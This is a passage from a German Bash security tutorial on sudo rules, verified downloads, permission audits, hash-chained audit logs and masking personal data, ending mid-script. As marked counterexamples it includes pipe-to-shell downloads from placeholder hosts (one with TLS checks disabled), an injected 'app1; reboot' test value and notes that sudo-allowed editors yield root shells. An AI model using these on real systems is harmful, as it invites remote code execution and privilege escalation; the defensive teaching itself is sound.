Die Konfiguration von `sudo` selbst verdient Sorgfalt. In `/etc/sudoers` (immer mit `visudo` bearbeiten, das die Syntax prüft) oder besser in einer eigenen Datei unter `/etc/sudoers.d/` werden Regeln der Form `benutzer host=(zielbenutzer) befehl` festgelegt. Zu weit gefasst sind Regeln wie `ALL=(ALL) ALL` oder `NOPASSWD: ALL`, sowie Erlaubnisse für Programme, die sich zu einer Shell ausweiten lassen (Editoren, `less`, `find`, `tar`, Interpreter): Wer `sudo vim` darf, darf damit eine Root-Shell öffnen. Besser sind *exakte Befehle mit festen Argumenten* und ein Wrapper-Skript, das mit `sudo` aufgerufen wird, *selbst gründlich seine Eingaben prüft* und nur von Root beschreibbar ist. Die Umgebung wird von `sudo` standardmäßig bereinigt (`env_reset`); das sollte man nicht aufweichen. Außerdem dürfen weder das privilegierte Skript noch seine Bibliotheken oder Verzeichnisse für normale Benutzer beschreibbar sein, sonst ist die Rechteerhöhung eine Hintertür.

```bash
#!/usr/bin/env bash
# privileg-demo.sh - Root-Pruefung und gezielte Rechteerhoehung
set -euo pipefail

# --- 1. Root nur wenn noetig: das Skript selbst soll NICHT als root laufen
nicht_als_root() {
    if (( EUID == 0 )); then
        echo "Dieses Skript soll nicht als root laufen (Benutzer: $(id -un))." >&2
        return 1
    fi
}

# --- 2. Umgekehrt: ein Skript, das Root braucht, prueft das sofort
verlange_root() {
    (( EUID == 0 )) || { echo "Benoetigt root. Aufruf mit: sudo $0" >&2; return 1; }
}

# --- 3. Nur ein Schritt braucht Rechte: gezielt anheben
privilegiert() {
    if (( EUID == 0 )); then "$@"
    elif command -v sudo >/dev/null 2>&1; then sudo -n -- "$@"
    else echo "weder root noch sudo vorhanden" >&2; return 1; fi
}

echo "Effektive UID: $EUID (Benutzer: $(id -un))"
nicht_als_root && echo "Ausfuehrung ohne Root-Rechte: ok" || echo "(laeuft als root)"

echo "--- Beispiel einer minimalen sudoers-Regel (nur als Text, nichts wird installiert):"
cat <<'ENDE'
# /etc/sudoers.d/deploy  (Bearbeiten nur mit: visudo -f /etc/sudoers.d/deploy)
deploy ALL=(root) NOPASSWD: /usr/local/sbin/dienst-neustart.sh app1, \
                           /usr/local/sbin/dienst-neustart.sh app2
ENDE

echo "--- Dienstkonto ohne Login anlegen (als Befehlszeile gezeigt, nicht ausgefuehrt):"
echo "useradd --system --no-create-home --shell /usr/sbin/nologin deploy"

echo "--- Wrapper prueft seine Eingabe selbst, auch wenn sudo sie schon eingeschraenkt hat"
dienst_neustart() {
    local name="${1:-}"
    case $name in app1|app2) ;; *) echo "unbekannter Dienst: '$name'" >&2; return 2 ;; esac
    echo "wuerde neu starten: $name (mit privilegiert systemctl restart $name)"
}
dienst_neustart app1
dienst_neustart "app1; reboot" || true
```

Das Skript zeigt die Werkzeuge in Kleinform. Die beiden Prüffunktionen lesen die Variable `EUID`, die effektive Benutzer-ID: 0 bedeutet Root. Je nach Bedarf bricht ein Skript ab, wenn es zu viel Macht hat, oder wenn es zu wenig hat. Die Funktion `privilegiert` hebt *nur den einen Befehl* an; `sudo -n` fragt nicht nach einem Passwort und scheitert stattdessen, was im automatisierten Betrieb gewünscht ist, damit nichts hängt. Die Regel für `sudoers.d` erlaubt dem Benutzer `deploy` genau ein Skript mit genau zwei erlaubten Argumenten; sie ist deshalb viel enger als eine allgemeine Erlaubnis. Das Beispiel gibt Regel und Befehlszeile nur aus, denn solche Änderungen am System gehören nicht in ein Übungsskript. Der Wrapper prüft den Namen des Dienstes mit `case` noch einmal selbst, nach dem Prinzip „Verteidigung in der Tiefe“: Auch wenn die `sudoers`-Regel versagt oder zu weit gefasst ist, kann keine fremde Eingabe durchrutschen.

Typische Fehler: Erstens wird ein ganzes Skript mit `sudo` gestartet, obwohl nur zwei Befehle Root benötigen; jeder Tippfehler läuft dann mit Root-Rechten. Zweitens eine `sudoers`-Regel mit `ALL` oder mit Programmen, die sich zur Shell ausweiten lassen. Drittens ein privilegiertes Skript, das ein normaler Benutzer ändern kann, oder das Dateien aus einem für alle beschreibbaren Ort lädt. Viertens verwendet man `NOPASSWD` großzügig, wo ein Passwort sinnvoll wäre. Fünftens laufen Dienste als Root, weil es „so einfach“ ist, statt als eigenes Konto. Sechstens wertet ein privilegiertes Skript Umgebungsvariablen aus der Aufruferumgebung aus (`PATH`, `LD_PRELOAD`, `BASH_ENV`); `sudo` bereinigt sie, aber ein Skript, das über `su` oder setuid-Mechanismen läuft, muss sie selbst absichern. Beachten Sie auch, dass Bash-Skripte mit gesetztem setuid-Bit unter Linux aus gutem Grund ignoriert werden; die Rechteerhöhung gehört in `sudo`, nicht in das Skript-Dateirecht.

```bash
# falsch: gesamtes Skript als root, breite sudoers-Regel
sudo ./deploy.sh
# in sudoers:  deploy ALL=(ALL) NOPASSWD: ALL

# richtig: nur der noetige Schritt privilegiert, Regel exakt
sudo -n -- /usr/local/sbin/dienst-neustart.sh app1
# in sudoers:  deploy ALL=(root) NOPASSWD: /usr/local/sbin/dienst-neustart.sh app1
```

> **Merke**
>
> Möglichst als unprivilegierter Benutzer laufen. Rechte nur für den einzelnen Befehl erhöhen. `sudoers` mit `visudo` und exakten Befehlen; keine Shell-Ausbrüche erlauben. Privilegierte Skripte gehören root und sind nicht beschreibbar für andere. Wrapper prüfen Eingaben zusätzlich selbst.

> **Praxisbeispiel**
>
> Das Deployment-Konto `deploy` darf per `sudo` ausschließlich zwei Skripte als Root aufrufen: eines startet die Anwendung neu, das andere rotiert Logs. Wird das Konto kompromittiert, kann der Angreifer genau diese beiden Aktionen auslösen und nicht die Maschine übernehmen.

## 8.6 Sichere Downloads

Skripte laden ständig Dinge aus dem Netz: Installationsprogramme, Konfigurationen, Abhängigkeiten, Archive. Jeder dieser Downloads ist ein Vertrauensakt. Ein manipuliertes Programm, das ein Skript herunterlädt und ausführt, läuft mit den Rechten des Skripts. Man spricht von *Supply-Chain-Risiken* (Lieferkettenrisiken): Der Angriff erfolgt nicht auf das eigene System, sondern auf eine Quelle, der man vertraut. Das berüchtigtste Muster ist `curl https://beispiel.example/install.sh | bash`: Der Befehl führt unbesehen aus, was der Server ausliefert, ohne dass man es vorher gesehen, geprüft oder gespeichert hätte; bricht die Verbindung mittendrin ab, führt die Shell womöglich einen halben Befehl aus.

Drei Schutzschichten gehören zusammen. Erstens *der Transportweg*: Nur über TLS (HTTPS) laden und die Zertifikatsprüfung nie abschalten. Bei `curl` schützen Optionen wie `--proto '=https'` (nur HTTPS, auch bei Weiterleitungen) und `--tlsv1.2` (Mindestversion), `--fail` (Fehlercodes als Fehler behandeln) und `--location` mit Bedacht; `-k` oder `--insecure` gehören nie in ein Skript. TLS sagt allerdings nur, dass man mit dem richtigen *Server* spricht, nicht, dass die *Datei* unverändert und harmlos ist: Ist der Server kompromittiert, liefert er die manipulierte Datei über eine einwandfreie Verbindung. Zweitens *die Integrität*: Der Anbieter veröffentlicht eine *Prüfsumme* (meist SHA-256), die man nach dem Download selbst berechnet und vergleicht. Wichtig ist, dass die Prüfsumme *über einen anderen Weg* stammt als die Datei (andere Domain, Release-Seite, fest im eigenen Repository hinterlegt); eine Prüfsumme, die neben der Datei vom selben Server kommt, schützt nur vor Übertragungsfehlern. Drittens *die Authentizität*: Eine digitale *Signatur* (zum Beispiel mit GnuPG oder Sigstore/cosign) beweist, dass die Datei vom Inhaber eines bekannten Schlüssels stammt. Den öffentlichen Schlüssel muss man *vorher* und über einen unabhängigen Weg bezogen und seine Fingerabdruck-Prüfung durchgeführt haben, sonst vertraut man blind.

Das richtige Vorgehen lautet: in ein temporäres Verzeichnis laden, *nicht ausführen*, Prüfsumme und gegebenenfalls Signatur prüfen, erst bei Erfolg an den Zielort verschieben und dann nutzen. Man *pinnt* Versionen und erwartete Prüfsummen im eigenen Repository, statt immer „latest“ zu holen, weil sich ein „latest“ unbemerkt ändern kann. Für Pakete des Betriebssystems nutzt man den Paketmanager mit seinen signierten Repositories; für Container und Abhängigkeiten gibt es Lockfiles und Digest-Pinning.

```bash
#!/usr/bin/env bash
# download-demo.sh - laden, pruefen, erst dann installieren (lokal simuliert)
set -euo pipefail
umask 077
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT
cd "$arbeit"

# --- "Server": Datei und Pruefsumme (in der Praxis kommen sie aus dem Netz)
mkdir server ziel
printf '#!/bin/sh\necho "Werkzeug v1.2 laeuft"\n' > server/werkzeug.sh
erwartete_summe="$(sha256sum < server/werkzeug.sh | cut -d' ' -f1)"   # aus anderer Quelle!

# --- Download: curl-Optionen (hier gegen file://, damit es offline laeuft)
laden() {                                        # laden QUELLE ZIELDATEI
    curl --fail --silent --show-error --location \
         --max-time 30 --retry 2 -o "$2" -- "$1"
}
laden "file://$arbeit/server/werkzeug.sh" ziel/werkzeug.sh.tmp

# --- Pruefsumme verifizieren BEVOR irgendetwas ausgefuehrt wird
pruefe_summe() {                                 # pruefe_summe DATEI ERWARTET
    local ist
    ist="$(sha256sum < "$1" | cut -d' ' -f1)"
    [[ $ist == "$2" ]] || { echo "PRUEFSUMME FALSCH fuer $1" >&2; return 1; }
}

if pruefe_summe ziel/werkzeug.sh.tmp "$erwartete_summe"; then
    chmod 755 ziel/werkzeug.sh.tmp
    mv -f -- ziel/werkzeug.sh.tmp ziel/werkzeug.sh      # atomar an den Zielort
    ./ziel/werkzeug.sh
fi

# --- Manipulation simulieren: Server liefert veraenderte Datei
printf '#!/bin/sh\necho "BOESE"\n' > server/werkzeug.sh
laden "file://$arbeit/server/werkzeug.sh" ziel/zweite.tmp
pruefe_summe ziel/zweite.tmp "$erwartete_summe" || { rm -f ziel/zweite.tmp; echo "Download verworfen"; }

# --- Standardformat von sha256sum -c (so liefern es viele Projekte)
( cd ziel && sha256sum werkzeug.sh > SHA256SUMS && sha256sum -c --quiet SHA256SUMS && echo "sha256sum -c: ok" )
```

Das Beispiel simuliert Server und Client in einem Verzeichnis, damit es offline läuft; die Logik ist aber genau die einer echten Installation. Die Erwartungssumme wird zuerst festgehalten (in der Praxis steht sie fest im Skript oder in einer separat bezogenen Datei). Die Funktion `laden` verwendet die Optionen, die man in Skripten haben möchte: Fehler als Fehler melden, keine Fortschrittsanzeige, aber Fehlertexte, ein Zeitlimit und begrenzte Wiederholungen; bei einem echten Download kämen `-{}-proto '=https'` und `-{}-tlsv1.2` hinzu. Die Datei wird zunächst unter einem `.tmp`-Namen abgelegt, geprüft und erst dann mit `mv` umbenannt, also *atomar* in Betrieb genommen. Im zweiten Teil liefert der „Server“ eine veränderte Datei: Die Prüfsumme stimmt nicht, die Datei wird verworfen und nie ausgeführt. Am Ende steht das übliche Format `SHA256SUMS`, das man mit `sha256sum -c` prüft.

Typische Fehler: Erstens `curl ... | bash` ohne Prüfung. Zweitens wird die Prüfsumme vom selben Ort wie die Datei geholt, und niemand bemerkt, dass ein kompromittierter Server beide austauscht. Drittens wird `-k` verwendet, „weil das Zertifikat Probleme macht“, und damit die gesamte TLS-Sicherheit aufgegeben. Viertens: `curl` ohne `-{}-fail` behandelt eine Fehlerseite (404) als erfolgreichen Download, und das Skript prüft eine HTML-Fehlermeldung statt der Datei. Fünftens wird „latest“ geladen, statt eine bestimmte Version samt Prüfsumme festzulegen. Sechstens entpackt man ein Archiv, ohne die Pfade darin zu prüfen (*Zip-Slip* / Tar mit `../` oder absoluten Pfaden); `tar -tf` listet den Inhalt vorher auf. Siebtens: Skripte, die selbst Skripte nachladen und ausführen, ohne Versionsfestlegung und Prüfung.

```bash
# falsch: blind ausfuehren, TLS-Pruefung abgeschaltet, "latest"
curl -k https://downloads.example/tool/latest/install.sh | bash

# richtig: laden, pruefen, dann erst benutzen; Version und Summe festgelegt
VERSION=1.2.0
SUMME=3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b
curl --fail --proto '=https' --tlsv1.2 -sSL -o tool.tgz -- "https://downloads.example/tool/$VERSION/tool.tgz"
echo "$SUMME  tool.tgz" | sha256sum -c -
```

> **Merke**
>
> Nie unbesehen ausführen. TLS nutzen und nie abschalten; die Datei *zusätzlich* mit einer Prüfsumme aus unabhängiger Quelle und möglichst mit Signatur prüfen. Erst temporär laden, prüfen, dann atomar an den Zielort. Versionen und Summen festlegen („pinnen“), Archivinhalte vor dem Entpacken ansehen.

> **Praxisbeispiel**
>
> Ein Build-Skript lädt ein Hilfsprogramm in einer festen Version. Seit die erwartete SHA-256-Summe im Repository steht und im Review geändert werden muss, würde ein untergeschobenes Binärprogramm den Build abbrechen statt unbemerkt in jede ausgelieferte Version zu gelangen.

## 8.7 Dateirechte und Ownership

Unter Linux entscheiden *Eigentümer*, *Gruppe* und *Rechtebits* (lesen, schreiben, ausführen) darüber, wer eine Datei benutzen darf (Modul 2). Für die Sicherheit kommt es auf einige feste Regeln an. Konfigurationsdateien mit Geheimnissen und *private Schlüssel* sind nur für den Eigentümer lesbar (`600`, in Ausnahmefällen `640` mit einer dedizierten Gruppe); `ssh` weigert sich sogar, einen privaten Schlüssel zu benutzen, wenn er zu offen ist. Programme und Skripte, die privilegiert laufen, gehören `root` und sind für andere *nicht beschreibbar*: Wer sie ändern kann, kann Code unter fremden Rechten ausführen. Dasselbe gilt für alle Verzeichnisse auf dem Weg dorthin: Ist ein übergeordnetes Verzeichnis für andere beschreibbar, kann jemand dort Dateien umbenennen oder ersetzen, selbst wenn die Datei selbst geschützt ist.

Besondere Aufmerksamkeit verdienen *world-writable* Pfade, also Dateien oder Verzeichnisse mit Schreibrecht für alle. Gemeinsame Ablageorte wie `/tmp` sind absichtlich so eingerichtet, aber mit dem *Sticky Bit* (`1777`): Dann darf jeder Dateien anlegen, aber nur Eigentümer und Verzeichnisbesitzer dürfen sie löschen oder umbenennen. Ein world-writable Verzeichnis *ohne* Sticky Bit ist fast immer ein Fehler. Zu den heiklen Spezialbits gehören *setuid* und *setgid* (`4000`, `2000`): Programme laufen mit den Rechten des Dateieigentümers beziehungsweise der Gruppe. Sie gehören nur an wenige, sorgfältig geprüfte Stellen; ein unbeabsichtigtes setuid-Programm ist eine Rechteausweitung. Zusätzlich gibt es ACLs und erweiterte Attribute (`getfacl`, `lsattr`), die ein Skript beim Auditieren beachten sollte.

Skripte setzen Rechte nicht nur, sondern *prüfen* sie auch: ein Härtungs- oder Audit-Skript durchsucht Verzeichnisse mit `find` nach world-writable Dateien (`-perm -0002`), nach setuid-Programmen (`-perm -4000`) und nach Dateien ohne gültigen Eigentümer (`-nouser`, `-nogroup`). Wichtig beim Ändern: `chmod -R` und `chown -R` sind mächtig und gefährlich, vor allem mit Symlinks und falschem Startpunkt; man arbeitet mit `find ... -exec chmod ... {} +` gezielt für Dateien oder Verzeichnisse, verwendet bei `chown` die Option `-h`, damit Symlinks selbst und nicht deren Ziel angepasst werden, und prüft die Zielpfade vorher (Modul 8.2).

```bash
#!/usr/bin/env bash
# rechte-audit.sh - Schluesseldatei haerten und kleinen Rechte-Audit ausfuehren
set -euo pipefail
umask 077
basis="$(mktemp -d)"
trap 'rm -rf -- "$basis"' EXIT
mkdir -p "$basis"/{conf,shared,bin}

# --- Testumgebung mit absichtlichen Maengeln
echo "db_pass=geheim" > "$basis/conf/app.conf";  chmod 644 "$basis/conf/app.conf"
echo "KEY"            > "$basis/conf/privat.key"; chmod 664 "$basis/conf/privat.key"
chmod 777 "$basis/shared"                                # world-writable, KEIN Sticky Bit
printf '#!/bin/sh\n' > "$basis/bin/tool.sh";    chmod 4755 "$basis/bin/tool.sh"   # setuid!

# --- Pruefung: Datei hat hoechstens Rechte MAXIMAL (oktal)?
rechte_ok() {                      # rechte_ok DATEI MAXIMAL
    local ist; ist="$(stat -c '%a' -- "$1")"
    (( (8#$ist & ~8#$2) == 0 ))    # kein Bit gesetzt, das ueber MAXIMAL hinausgeht
}

haerte_geheimnis() {               # haerte_geheimnis DATEI
    if ! rechte_ok "$1" 600; then
        echo "korrigiere $(stat -c '%a' -- "$1") -> 600: ${1#"$basis"/}"
        chmod 600 -- "$1"
    fi
}

echo "--- Haertung:"
for f in "$basis"/conf/*; do haerte_geheimnis "$f"; done

echo "--- Audit: world-writable Verzeichnisse ohne Sticky Bit"
find "$basis" -type d -perm -0002 ! -perm -1000 -printf '  %m %P\n'

echo "--- Audit: setuid/setgid-Dateien"
find "$basis" -type f \( -perm -4000 -o -perm -2000 \) -printf '  %m %P\n'

echo "--- Reparatur der Funde"
chmod 1777 "$basis/shared"              # Sticky Bit setzen (wie /tmp)
chmod u-s,go-w "$basis/bin/tool.sh"
find "$basis" -printf '%m %P\n' | sort -k2
```

Die Funktion `rechte_ok` nutzt Bit-Arithmetik: `8#$ist` liest die dreistellige Zahl von `stat` als Oktalzahl, `~8#$2` invertiert die erlaubte Maske, und die Und-Verknüpfung ergibt genau die Bits, die *zu viel* gesetzt sind; bleibt nichts übrig, ist die Datei in Ordnung. So entsteht eine allgemeine Prüfung („höchstens `600`“, auch `400` gilt als in Ordnung) statt eines starren Vergleichs mit einer Zahl. `haerte_geheimnis` meldet nur tatsächliche Änderungen, also idempotent im Sinne von Modul 6.7. Das Audit besteht aus zwei `find`-Aufrufen: world-writable Verzeichnisse ohne Sticky Bit (`-perm -0002 ! -perm -1000`) und Programme mit setuid- oder setgid-Bit. Die Reparatur setzt am Schluss das Sticky Bit und nimmt dem Programm die gefährlichen Bits.

Typische Fehler: Erstens `chmod 777` als „schnelle Lösung“, wenn etwas nicht funktioniert; das Problem ist fast nie das Recht, sondern der falsche Eigentümer oder die falsche Gruppe. Zweitens `chmod -R 755` auf Verzeichnisbäumen, wodurch alle Dateien ausführbar werden und Schlüsseldateien öffnen. Drittens `chown -R` mit einer leeren Variablen im Pfad oder mit Symlinks. Viertens setzt man Rechte erst nach dem Schreiben, statt mit der passenden umask (Modul 8.1). Fünftens ist ein Skript root-eigen und ausführbar, aber das Verzeichnis darüber für andere beschreibbar. Sechstens sind Rechte sauber, aber Backups, Kopien oder Exporte derselben Daten liegen an anderen, offenen Orten. Siebtens vergisst man ACLs und Container-Mounts, bei denen die numerischen Benutzer-IDs des Hosts gelten.

```bash
# falsch: pauschal oeffnen, rekursiv, ohne Nachdenken
chmod -R 777 /srv/app
chown -R $BENUTZER:$GRUPPE $BASIS/    # leere Variablen => Chaos

# richtig: gezielt, mit Schutz vor leeren Variablen
find "${BASIS:?}" -type d -exec chmod 750 {} +
find "${BASIS:?}" -type f -exec chmod 640 {} +
chmod 600 "$BASIS/conf/privat.key"
chown -h "${BENUTZER:?}:${GRUPPE:?}" -- "$BASIS/conf/app.conf"
```

> **Merke**
>
> Schlüssel und Geheimnisse `600`; privilegierte Skripte gehören root und sind für andere nicht beschreibbar, samt Verzeichnissen. World-writable nur mit Sticky Bit. setuid sparsam. Rechte gezielt mit `find` setzen, nicht pauschal rekursiv. Statt `777`: Eigentümer und Gruppe korrigieren.

> **Praxisbeispiel**
>
> Ein Auditskript läuft wöchentlich auf allen Servern und meldet world-writable Verzeichnisse ohne Sticky Bit, neue setuid-Dateien und Schlüsseldateien mit offenen Rechten. Dadurch fiel ein Entwickler-Testverzeichnis mit `777` auf, in dem ein Dienst als Root Skripte ausführte, ein klassischer Weg zur Rechteausweitung.

## 8.8 Auditierbarkeit

*Auditierbarkeit* heißt: Man kann im Nachhinein feststellen, *wer* *wann* *was* getan hat, von *wo* aus und mit *welchem Ergebnis*. Das dient der Fehlersuche, der Aufklärung von Sicherheitsvorfällen und dem Nachweis gegenüber Prüfern (Compliance). Ein Skript, das administrative Aktionen ausführt (Benutzer anlegen, Daten löschen, Konfiguration ändern, Zugriffe vergeben), soll solche Aktionen *verlässlich protokollieren*. Ein Audit-Log unterscheidet sich vom normalen Betriebslog (Modul 6.5): Es hat feste Felder, ist vollständig für alle sicherheitsrelevanten Aktionen, wird länger aufbewahrt und wird vor Manipulation geschützt.

Ein Audit-Eintrag enthält mindestens einen Zeitstempel (UTC, ISO 8601), den handelnden Benutzer (nicht nur den Systembenutzer, sondern bei `sudo` auch `SUDO_USER`), den Rechner, die Aktion, das Objekt, das Ergebnis und gegebenenfalls eine Korrelations-ID. Er darf *keine Geheimnisse* enthalten (Modul 8.4) und möglichst keine unnötigen personenbezogenen Daten (Modul 8.9). Zum Protokollieren bietet das Linux-System den Dienst *syslog*/*journald*: Das Programm `logger` schreibt Meldungen dorthin (`logger -t audit -p auth.notice "..."`), wo sie zentral gesammelt werden können. Für tiefere Überwachung gibt es das Kernel-Auditsystem (`auditd`), das Dateizugriffe und Systemaufrufe aufzeichnet; Skripte können dazu Regeln anlegen oder auswerten.

Die Integrität der Protokolle ist ebenso wichtig wie ihr Inhalt. Wer einen Angriff durchführt, löscht zuerst die Spuren. Gegenmaßnahmen sind: Logs an einen *zentralen, getrennten Server* schicken, die Datei nur anhängbar machen (`chattr +a`), restriktive Rechte setzen und *manipulationssichtbar* schreiben, etwa durch eine *Hash-Kette*: Jeder Eintrag enthält den Hash des vorherigen Eintrags, sodass eine nachträgliche Änderung oder Löschung die Kette ab dieser Stelle bricht. Eine Hash-Kette verhindert keine Manipulation, macht sie aber *erkennbar*.

```bash
#!/usr/bin/env bash
# audit-demo.sh - Audit-Log mit festen Feldern und Hash-Kette
set -euo pipefail
umask 077
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT
AUDITLOG="$arbeit/audit.log"
: > "$AUDITLOG"

# --- Eintrag schreiben: Zeit | Benutzer | Host | Aktion | Objekt | Ergebnis | Hash der Vorzeile
audit() {                                 # audit AKTION OBJEKT ERGEBNIS
    local zeit akteur host vorher zeile
    zeit="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    akteur="${SUDO_USER:-$(id -un)}"
    host="$(hostname -s)"
    if [[ -s $AUDITLOG ]]; then
        vorher="$(tail -n 1 "$AUDITLOG" | sha256sum | cut -c1-16)"
    else
        vorher="0000000000000000"
    fi
    zeile="$zeit|$akteur|$host|$1|$2|$3|prev=$vorher"
    printf '%s\n' "$zeile" >> "$AUDITLOG"
    command -v logger >/dev/null 2>&1 && logger -t audit-demo -- "$1 $2 $3" || true
}

# --- Kette pruefen: stimmt jeder prev-Hash mit der tatsaechlichen Vorzeile ueberein?
pruefe_kette() {
    local vorzeile="" nr=0 soll ist zeile
    while IFS= read -r zeile; do
        nr=$((nr + 1))
        ist="${zeile##*prev=}"
        if (( nr == 1 )); then soll="0000000000000000"
        else soll="$(printf '%s\n' "$vorzeile" | sha256sum | cut -c1-16)"; fi
        if [[ $ist != "$soll" ]]; then echo "KETTE GEBROCHEN bei Zeile $nr"; return 1; fi
        vorzeile="$zeile"
    done < "$AUDITLOG"
    echo "Kette ok ($nr Eintraege)"
}

audit "user.create" "anna" "ok"
audit "perm.grant"  "anna:wiki" "ok"
audit "file.delete" "/srv/alt.tar" "denied"
cut -d'|' -f2-7 "$AUDITLOG"
pruefe_kette

echo "--- Manipulation: mittlere Zeile veraendern"
sed -i '2s/ok/OK-GEAENDERT/' "$AUDITLOG"
pruefe_kette || true
```

Die Funktion `audit` schreibt Einträge mit festen, durch `|` getrennten Feldern; so lassen sie sich später mit `cut` oder `awk` auswerten (Modul 5). Der Akteur ist `SUDO_USER`, wenn das Skript über `sudo` läuft, sonst der angemeldete Benutzer; das ist wichtig, denn `id -un` liefert unter `sudo` nur `root`. Jede Zeile trägt den gekürzten SHA-256-Hash der Vorzeile als `prev=`. `pruefe_kette` berechnet diese Hashes neu und vergleicht sie; nach der Manipulation der zweiten Zeile stimmt der Hash, den die *dritte* Zeile enthält, nicht mehr, und die Prüfung meldet den Bruch. Beachten Sie, dass eine geänderte *letzte* Zeile so nicht erkennbar wäre; dafür hinterlegt man den Hash der letzten Zeile regelmäßig an einem getrennten Ort. Zusätzlich geht jeder Eintrag per `logger` an das Systemprotokoll, das vom Skript aus nicht mehr verändert werden kann.

Typische Fehler: Erstens wird nur geloggt, was schiefgeht; für Audits zählen *auch erfolgreiche* Aktionen. Zweitens fehlt der handelnde Mensch, weil alles als `root` protokolliert wird. Drittens liegen die Logs auf demselben Server und mit denselben Rechten wie die Dienste, die sie schreiben, sodass ein Angreifer sie einfach löscht. Viertens landen Geheimnisse oder unmaskierte Eingaben im Log; Eingaben mit Zeilenumbrüchen können darüber hinaus *Log Injection* bewirken, also gefälschte Einträge erzeugen (Eingaben vor dem Protokollieren bereinigen oder escapen). Fünftens sind Zeitstempel in lokaler Zeit ohne Zeitzone, was den Abgleich zwischen Systemen erschwert. Sechstens ist die Aufbewahrungsdauer nirgends festgelegt, und die Logs werden entweder zu früh gelöscht oder unbegrenzt gesammelt (siehe Modul 8.9). Siebtens funktioniert die Protokollierung, aber niemand liest sie je; ohne Auswertung und Alarmierung ist sie nur Ballast.

```bash
# falsch: kein Akteur, kein Ergebnis, ungeprueft eingebaute Eingabe, lokale Zeit
echo "$(date) geloescht $datei" >> /var/log/admin.log

# richtig: feste Felder, UTC, Akteur, Ergebnis, Eingabe von Zeilenumbruechen befreit
datei_log="${datei//$'\n'/ }"
printf '%s|%s|%s|file.delete|%s|%s\n' \
    "$(date -u +%FT%TZ)" "${SUDO_USER:-$(id -un)}" "$(hostname -s)" "$datei_log" "$ergebnis" >> "$AUDITLOG"
```

> **Merke**
>
> Audit-Log = wer, wann, was, wo, Ergebnis, mit Zeitstempel in UTC. Auch Erfolge protokollieren, auch den echten Akteur hinter `sudo`. Keine Geheimnisse, Eingaben bereinigen. Logs vor Manipulation schützen: zentral, nur anhängbar, Hash-Kette. Aufbewahrung festlegen und Auswertung einplanen.

> **Praxisbeispiel**
>
> Nach einem Zwischenfall fragt die Prüfung, wer vor drei Wochen Schreibrechte auf ein Archiv vergeben hat. Weil das Admin-Skript jede Rechteänderung mit Akteur, Zeitpunkt und Ergebnis an einen zentralen Log-Server meldet, lässt sich die Frage in Minuten beantworten, und die Hash-Kette belegt, dass die Aufzeichnung unverändert ist.

## 8.9 Datenschutz

Skripte verarbeiten häufig *personenbezogene Daten* (PII, englisch für Personally Identifiable Information): Namen, E-Mail-Adressen, IP-Adressen, Kundennummern, Telefonnummern, Kennungen, die sich einer Person zuordnen lassen. Besonders unauffällig, aber folgenreich sind Logdateien: Sie sammeln IP-Adressen, Benutzernamen und manchmal ganze Anfragen mit Inhalten. Datenschutz in Skripten bedeutet vor allem drei Dinge: *so wenig wie möglich erheben* (Datenminimierung), *so kurz wie möglich aufbewahren* (Speicherbegrenzung, Retention) und *angemessen schützen* (Zugriffsrechte, Verschlüsselung, Maskierung).

Konkret kann ein Skript mehrere Techniken nutzen. *Maskieren*: personenbezogene Teile werden verdeckt, bevor sie in ein Log oder einen Export gelangen (aus `anna@beispiel.at` wird `a***@beispiel.at`). *Kürzen* von IP-Adressen: bei IPv4 das letzte Oktett nullen, was die Zuordnung zu einer Person erschwert. *Pseudonymisieren*: Ein Bezeichner wird durch einen abgeleiteten Wert ersetzt (zum Beispiel einen Hash mit geheimem Salz), sodass sich Datensätze weiterhin verknüpfen lassen, ohne die Person direkt zu nennen; die Zuordnung ist nur mit Zusatzinformation möglich. Pseudonymisierte Daten bleiben personenbezogen, anonymisierte nicht, aber echte Anonymisierung ist anspruchsvoll. *Exportminimierung*: Ein Export enthält nur die Spalten, die der Zweck verlangt (`cut`, `awk`, Modul 5).

Dazu kommen die *Aufbewahrung und Löschung*: Für jede Art von Daten ist festgelegt, wie lange sie gebraucht werden, und ein Skript löscht Abgelaufenes zuverlässig, etwa mit `find -mtime +N -delete`, protokolliert die Löschung (ohne die gelöschten personenbezogenen Inhalte zu wiederholen) und bezieht Kopien ein (Backups, Exporte, temporäre Dateien). Beim *Löschen auf Anfrage* (Betroffenenrechte) müssen auch Logs und Sicherungen bedacht werden; das ist technisch und organisatorisch eine Planungsaufgabe. Vorsicht: Aufbewahrungspflichten (zum Beispiel für steuerliche oder sicherheitsrelevante Aufzeichnungen) können dem Löschen entgegenstehen; welche Fristen gelten, ist eine *rechtliche* Frage, die nicht das Skript entscheidet.

> **Ergänzung aus der Nachrecherche**
>
> **Ergänzung aus der Nachrecherche:** Art. 32 der Datenschutz-Grundverordnung (DSGVO) verpflichtet Verantwortliche und Auftragsverarbeiter zu *risikoangemessenen technischen und organisatorischen Maßnahmen*. Genannt werden unter anderem die Pseudonymisierung und Verschlüsselung personenbezogener Daten, die dauerhafte Sicherstellung von Vertraulichkeit, Integrität, Verfügbarkeit und Belastbarkeit der Systeme, die rasche Wiederherstellung nach einem Zwischenfall sowie ein Verfahren zur regelmäßigen Überprüfung der Wirksamkeit der Maßnahmen (abgerufen, siehe Quellenverzeichnis). Die Grundsätze der Datenminimierung und der Speicherbegrenzung stehen in Art. 5 DSGVO (nicht gesondert abgerufen; siehe „weiterführend“). **Dies ist keine Rechtsberatung.** Was für ein konkretes Projekt gilt (Rechtsgrundlage, Fristen, Meldepflichten, Verträge), klärt die Datenschutzbeauftragte oder der Datenschutzbeauftragte beziehungsweise eine Rechtsberatung.

```bash
#!/usr/bin/env bash
# datenschutz-demo.sh - PII in Logs maskieren, pseudonymisieren, Retention
set -euo pipefail
umask 077
arbeit="$(mktemp -d)"
trap 'rm -rf -- "$arbeit"' EXIT
cd "$arbeit"

cat > zugriff.log <<'ENDE'
2026-10-01T10:00:00Z 192.168.14.77 anna.muster@beispiel.at GET /konto
2026-10-01T10:05:12Z 10.20.30.40 bob@firma.example POST /login
2026-10-02T08:00:00Z 192.168.14.77 anna.muster@beispiel.at GET /rechnung/17
ENDE

# --- 1. IPv4 kuerzen (letztes Oktett auf 0) und E-Mail maskieren
anonymisiere() {
    sed -E \
        -e 's/\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\.[0-9]{1,3}\b/\1.0/g' \
        -e 's/\b([A-Za-z0-9])[A-Za-z0-9._%+-]*@([A-Za-z0-9.-]+)/\1***@\2/g'
